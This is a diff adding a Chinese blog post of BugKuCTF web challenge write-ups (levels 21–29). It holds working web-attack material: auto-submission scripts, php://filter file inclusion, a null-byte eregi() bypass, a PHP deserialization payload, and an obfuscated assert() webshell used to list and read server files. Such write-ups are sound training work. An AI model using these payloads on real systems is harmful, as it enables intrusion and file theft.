@@ -134,6 +134,240 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-BugKuCTF—Web题 第21-30关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/03/28/BugKuCTF—Web题 第21-30关/">BugKuCTF — Web题(第21-30关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/03/28/BugKuCTF—Web题 第21-30关/" class="archive-article-date">
+  	<time datetime="2019-03-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前一部分链接：第11-20关Write-up"><a href="#前一部分链接：第11-20关Write-up" class="headerlink" title="前一部分链接：第11-20关Write-up"></a>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/03/08/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC11-20%E5%85%B3/">第11-20关Write-up</a></h3><h3 id="第二十一关（秋名山老司机）"><a href="#第二十一关（秋名山老司机）" class="headerlink" title="第二十一关（秋名山老司机）"></a>第二十一关（秋名山老司机）</h3><p>题目打开要求我们2秒内快速计算</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-1.png" alt="2-1"></p>
+<p>就想到用Python的Session机制，思想是：<code>自动抓取页面、计算、提交、保存Session、显示flag</code></p>
+<p>那此时就会碰到一个问题，我们计算好的值，同哪个变量提交给服务器？</p>
+<p>此时，页面多刷新几次，机会看到提示：<code>value</code>变量</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-2.png" alt="2-2"></p>
+<p>-写代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">a = requests.Session()</span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span></span><br><span class="line">b = a.get(url)</span><br><span class="line">soup = BeautifulSoup(b.text,<span class="string">'lxml'</span>)</span><br><span class="line">c = str(re.findall(<span class="string">'&lt;div&gt;(.*)&lt;/div&gt;'</span>,str(soup.find_all(<span class="string">'div'</span>))))[<span class="number">2</span>:<span class="number">-5</span>]</span><br><span class="line">result = eval(c)</span><br><span class="line">data = &#123;<span class="string">'value'</span>:result&#125;</span><br><span class="line">d = a.post(url,data)</span><br><span class="line">print(d.text)</span><br></pre></td></tr></table></figure>
+<p>多执行几次，flag就跳出来</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/1-3.png" alt="1-3"></p>
+<p>为什么要多执行几次呢？看了别人的WP：当计算结果超出一定长度时，服务器就不响应了。在此猜想：可能客户端 Python 脚本计算错误，也可能服务器端 PHP 脚本对大数计算有误差，还可能在 POST 请求过程中令大整数发生改变。至于是哪种，还请高手解答。</p>
+<hr>
+<h3 id="第二十二关（速度要快）"><a href="#第二十二关（速度要快）" class="headerlink" title="第二十二关（速度要快）"></a>第二十二关（速度要快）</h3><p>题目进去提示：<code>我感觉你得快点!!!</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-1.png" alt="2-1"></p>
+<p>查看源代码：<code>margin</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-2.png" alt="2-2"></p>
+<p>使用<code>Burpsuits</code>发送GET请求包，返回的内容里有flag字段，是<code>Base64加密</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-3.png" alt="2-3"></p>
+<p>拿去Notepad++解密一下，还是经过<code>Base64加密</code>，需要再次解密才会变成数字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-4.png" alt="2-4"></p>
+<p>那么现在这个数字应该就是我们要的值，并且作为变量<code>margin</code>的值提交上去才行</p>
+<p>写代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,requests</span><br><span class="line"></span><br><span class="line">a = requests.Session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">b = a.get(url)</span><br><span class="line">b = b.headers[<span class="string">'flag'</span>]</span><br><span class="line">c = str(base64.b64decode(b))[<span class="number">-9</span>:<span class="number">-1</span>]</span><br><span class="line">d = base64.b64decode(c)</span><br><span class="line">result = d.decode()</span><br><span class="line">data = &#123;<span class="string">'margin'</span>:result&#125;</span><br><span class="line"></span><br><span class="line">flag = a.post(url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+<p>直接拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/2-5.png" alt="2-5"></p>
+<hr>
+<h3 id="第二十三关（Cookies欺骗）"><a href="#第二十三关（Cookies欺骗）" class="headerlink" title="第二十三关（Cookies欺骗）"></a>第二十三关（Cookies欺骗）</h3><p>链接进去后只看到一串一直重复的文字</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-1.png" alt="3-1"></p>
+<p>但是注意到<code>URL</code>的<code>filename</code>字段后面接的是<code>Base64</code>密文，拿去解密一下是：<code>key.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-2.png" alt="3-2"></p>
+<p>我们将<code>index.php</code>也经过<code>Base64</code>加密，放上去，然后将<code>line</code>参数调成1。嗯？有料</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-3.png" alt="3-3"></p>
+<p>调成2、3试一下，也都有内容</p>
+<p>那就直接写个脚本全部抓下来看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"index.php"</span></span><br><span class="line">s = s.encode()</span><br><span class="line">s = base64.b64encode(s)</span><br><span class="line">s = s.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    url = <span class="string">"http://123.206.87.240:8002/web11/index.php?line="</span> + i + <span class="string">"&amp;filename="</span> + s</span><br><span class="line">    r = requests.get(url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(r.text):</span><br><span class="line">        print(r.text[<span class="number">0</span>:<span class="number">-2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>读取如下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关于<code>问号（?）</code>的用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[表达式] ? [结果1]:[结果2]		//当表达式为True时，返回结果1;当表达式为False时，返回结果2</span><br></pre></td></tr></table></figure>
+<p>所以当<code>Cookie</code>中有<code>margin</code>，并且<code>file</code>的值为<code>keys.php的Base64密文</code>时，返回<code>keys.php</code>的值</p>
+<p><code>Burpsuits</code>提交，成功获得<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/3-5.png" alt="3-5"></p>
+<hr>
+<h3 id="第二十四关（Never-give-up）"><a href="#第二十四关（Never-give-up）" class="headerlink" title="第二十四关（Never give up）"></a>第二十四关（Never give up）</h3><p>链接进去没有提示有用的信息，只显示”never never never give up !!!”</p>
+<p>右键”查看网页源代码”，看到提示信息<code>&lt;!--1p.html--&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-1.png" alt="4-1"></p>
+<p>我们直接在<code>view-source</code>的后面改成<code>1p.html</code>就可以看到内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-2.png" alt="4-2"></p>
+<p>内容显然是经过<code>url编码</code>和<code>Base64加密</code>的，那就直接复制到<code>Notepad++</code>里进行转换</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-3.png" alt="4-3"></p>
+<p>对其中几个函数解释一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stripos()：</span><br><span class="line">函数查找字符串在另一字符串中第一次出现的位置（不区分大小写），返回一个数字</span><br><span class="line"></span><br><span class="line">eregi()：</span><br><span class="line">用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则返回false</span><br><span class="line">和 ereg() 完全相同，只除了在匹配字母字符时忽略大小写的区别</span><br></pre></td></tr></table></figure>
+<p>开始对源码中<code>$id</code>、<code>$a</code>、<code>$b</code> 三个变量需要满足的条件进行讲解</p>
+<h4 id="一、-id（弱类型比较）"><a href="#一、-id（弱类型比较）" class="headerlink" title="一、$id（弱类型比较）"></a>一、$id（弱类型比较）</h4><p>变量 $id 若想满足非空非零，且弱等于整型数 0，则 $id 的值只能为非空非零字符串</p>
+<p>我们随便设置一个值：$id=bugku，如下图：</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-4.png" alt="4-4"></p>
+<h4 id="二、-a（PHP伪协议）"><a href="#二、-a（PHP伪协议）" class="headerlink" title="二、$a（PHP伪协议）"></a>二、$a（PHP伪协议）</h4><p>源码中变量 $data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流</p>
+<p>在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。因此这里用伪协议 php:// 来访问输入输出的数据流，其中 php://input可以访问原始请求数据中的只读流。这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!</p>
+<h4 id="三、-b（eregi-截断漏洞）"><a href="#三、-b（eregi-截断漏洞）" class="headerlink" title="三、$b（eregi()截断漏洞）"></a>三、$b（eregi()截断漏洞）</h4><p>CTF 题做多了就知道 ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。这个漏洞可以用<code>url中空格的编码</code>：<code>%00</code>来绕过</p>
+<p>源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “%00”，即eregi(“111”,”1114”)，满足 “111”去匹配 “1114” 成功。因此，这里假设 $b = “%0012345”，才能满足以上三个条件</p>
+<p>构造<code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=Bugku&amp;&amp;a=php://input&amp;&amp;b=%0012345</span><br><span class="line"></span><br><span class="line">//请求主体中提交字符串：bugku is a nice plateform!</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-5.png" alt="4-5"></p>
+<p>成功拿下flag</p>
+<p>不过此题还有一个更简单的做法。。。。</p>
+<p>直接访问<code>f4l2a3g.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/4-6.png" alt="4-6"></p>
+<hr>
+<h3 id="第二十五关（welcome-to-bugkuctf）"><a href="#第二十五关（welcome-to-bugkuctf）" class="headerlink" title="第二十五关（welcome to bugkuctf）"></a>第二十五关（welcome to bugkuctf）</h3><p>链接进去没有提示有用信息，只是提示：”you are not the number of bugku !”</p>
+<p>查看源代码，看到了提示</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-1.png" alt="5-1"></p>
+<p>看到<code>file_get_contents()</code>和<code>include()</code>想到之前的知识点，构造<code>payload</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?txt=php://&amp;&amp;file=php://filter/read=convert.base64-encode//resource=hint.php</span><br><span class="line"></span><br><span class="line">//password变量好像暂时用不上，就先不传入了</span><br><span class="line">//请求主体中提交字符串：welcome to the bugkuctf</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-2.png" alt="5-2"></p>
+<p>将那串<code>Base64</code>拿去解码，得到如下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>现在，直接将<code>$file</code>变量改成<code>flag.php</code>是不行的，会返回一串乱码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-4.png" alt="5-4"></p>
+<p>没有思路后看别人的WriteUp，我们就按照之前的步骤看<code>index.php</code>的源代码</p>
+<p>为什么是<code>index.php</code>呢</p>
+<p>第一：因为这个页面通常是一个网站的关键页面，有重要信息</p>
+<p>第二：在我们给<code>$file</code>变量添加内容后，返回<code>hello friend!</code>，在其他源代码没见过，所以可以猜测有其他内容</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-5.png" alt="5-5"></p>
+<p>把获得的<code>Base64密文</code>拿去解密得到代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>观察代码，在第八行时利用了正则匹配，当检测到<code>$file</code>变量中含有<code>flag</code>关键字，返回<code>不能现在就给你flag哦</code>，这应该就是刚才我们得到的乱码。这样的话，$flie变量就不能含有flag才能执行<code>else中的语句</code></p>
+<p>使用<code>include()</code>来处理<code>$file</code>变量，将变量<code>$password</code>进行逆序列化，然后输出<code>$password</code>的值</p>
+<p>回到通过<code>hint.php</code>获得的代码块，<code>Flag类</code>，看到里面有一个$file属性，并且有一个魔术方法<code>_tostring()</code>，这个方法的作用就是当调用实例化对象时就会自动执行<code>_tostring()</code>这个方法。简单来说创造一个这个类的对象就会调用这个方法。而在<code>_tostring()</code>中，会输出以字符串的形式输出<code>$file</code>，根据上面的这些条件，我们可以让$password为<code>Flag</code>类型，并且让FLAG中的$file就等于flag.php，这样我们就可以得到flag.php的内容了，不过要记得，前面$password进行了反序列化的操作，所以我们要先把它序列化。在本地写一个php脚本，来获取<code>$password</code>的值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="keyword">new</span> Flag;</span><br><span class="line">$test-&gt;file = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-7.png" alt="5-7"></p>
+<p>现在构造<code>payload</code>：</p>
+<p>这里<code>$file</code>要记得填<code>hint.php</code>，要将这个包含进来才可以，改成其他的会失败，因为失去Flag类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?txt=php://input&amp;&amp;file=hint.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>通过Burpsuits提交，得到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/5-8.png" alt="5-8"></p>
+<hr>
+<h3 id="第二十六关（过狗一句话）"><a href="#第二十六关（过狗一句话）" class="headerlink" title="第二十六关（过狗一句话）"></a>第二十六关（过狗一句话）</h3><p>有提示：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">	$poc_1=explode(<span class="string">"#"</span>,$poc); </span><br><span class="line">	$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">	$poc_2($_GET[<span class="string">'s'</span>]) </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-1.png" alt="6-1"></p>
+<p>可以看出<code>$poc_2=assert</code>，也就是<code>$poc_2($_GET[&#39;s&#39;])</code>  = <code>assert($_GET[&#39;s&#39;])</code></p>
+<p>可以利用<code>assert()</code>函数存在<code>代码执行漏洞</code></p>
+<p>数组形式返回当前目录下的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=print_r(scandir(<span class="string">'./'</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-2.png" alt="6-2"></p>
+<p>注意到其中的一个文件：<code>flag_sm1skla1.txt</code></p>
+<p>直接访问，拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-3.png" alt="6-3"></p>
+<h4 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h4><p>可以继续利用这个漏洞，读取其他任意想要读取的文件</p>
+<p>读取上一级目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=print_r(scandir(&apos;../&apos;))</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/6-4.png" alt="6-4"></p>
+<hr>
+<h3 id="第二十七关（字符？正则？）"><a href="#第二十七关（字符？正则？）" class="headerlink" title="第二十七关（字符？正则？）"></a>第二十七关（字符？正则？）</h3><p>链接进去直接看到代码，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>分析一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">简单复习一下preg_match()：</span><br><span class="line">preg_match(string $pattern , string $subject , array $matches)</span><br><span class="line"></span><br><span class="line">pattern</span><br><span class="line">要搜索的模式，字符串类型。</span><br><span class="line"></span><br><span class="line">subject</span><br><span class="line">输入字符串。</span><br><span class="line"></span><br><span class="line">matches</span><br><span class="line">如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">模式的解释：</span><br><span class="line">1.表达式直接写出来的字符串直接利用，如key</span><br><span class="line">2.“.”：代表任意字符</span><br><span class="line">3.“*”：代表一个或一序列字符重复出现的次数，即前一个字符重复任意次</span><br><span class="line">4.“\/”：代表“/”</span><br><span class="line">5.[a-z]：代表a-z中的任意一个字符</span><br><span class="line">6.[[:punct:]]：代表任意一个各种符号</span><br><span class="line">7./i：代表大小写不敏感</span><br><span class="line">8.&#123;4,7&#125;：代表前一个字符，连续出现的次数是4-7次就可以</span><br></pre></td></tr></table></figure>
+<p>这样我们就可以的出我们的<code>id</code>的有效值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=key999key9999key:/9/999keya!</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/7-1.png" alt="7-1"></p>
+<hr>
+<h3 id="第二十八关（前女友-SKCTF-）"><a href="#第二十八关（前女友-SKCTF-）" class="headerlink" title="第二十八关（前女友(SKCTF)）"></a>第二十八关（前女友(SKCTF)）</h3><p>链接打不开，先放着吧</p>
+<hr>
+<h3 id="第二十九关（login1-SKCTF-）"><a href="#第二十九关（login1-SKCTF-）" class="headerlink" title="第二十九关（login1(SKCTF)）"></a>第二十九关（login1(SKCTF)）</h3><p>题目有提示：SQL约束攻击</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-1.png" alt="9-1"></p>
+<p>链接进去后点击”没有账号”，随便注册一个账号。返回登陆时，提示我们”不是管理员还想看flag?!”</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/BugkuCTFWeb/21-30/9-2.png" alt="9-2"></p>
+<p>那也就是提示我们，管理员才能看flag，那怎么通过管理员的身份去查看flag呢？注册一个管理员账号</p>
+<p>参考博客：<a href="https://blog.csdn.net/qq_42777804/article/details/81866940" target="_blank" rel="noopener">第二十九关WriteUp</a></p>
